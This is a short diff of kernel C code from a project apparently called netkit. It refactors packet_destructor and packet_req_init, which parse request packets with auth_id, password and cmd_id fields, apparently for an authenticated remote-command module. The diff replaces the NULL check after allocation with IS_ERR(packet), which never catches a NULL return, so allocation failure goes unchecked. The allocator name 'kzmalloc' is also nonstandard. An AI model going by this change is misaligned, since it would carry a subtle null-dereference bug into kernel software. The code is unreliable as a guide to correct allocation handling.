@@ -9,7 +9,7 @@
 /**
  * Destructs the packet. Called when packet refcount == 0
  */
-void packet_destructor(packet_req_t *packet)
+void packet_destructor(struct packet_req *packet)
 {
     NETKIT_LOG("[*] destructing packet...");
 
@@ -24,23 +24,21 @@ void packet_destructor(packet_req_t *packet)
  * on success: ptr
  * on failure: 0
  */
-packet_req_t *packet_req_init(const struct raw_packet_req *buffer, size_t count)
+struct packet_req *packet_req_init(const struct raw_packet_req *buffer, size_t count)
 {
-    packet_req_t *packet;
+    struct packet_req *packet;
     size_t packet_header_len;
 
-    NETKIT_LOG("[*] doing req size check...\n");
+    NETKIT_LOG("[*] packet req init...\n");
 
     // do size check
     packet_header_len = sizeof(packet->auth_id) + sizeof(packet->password) + sizeof(packet->cmd_id);
     if (count < packet_header_len || count > MAX_REQ_PACKET_LEN)
         return ERR_PTR(-EMSGSIZE);
 
-    NETKIT_LOG("[*] allocating packet...\n");
-
     // allocate memory
     packet = kzmalloc(sizeof(*packet), GFP_KERNEL);
-    if (!packet)
+    if (IS_ERR(packet))
         return ERR_PTR(-ENOMEM);
     
     // set fields manually to allow for field randomization
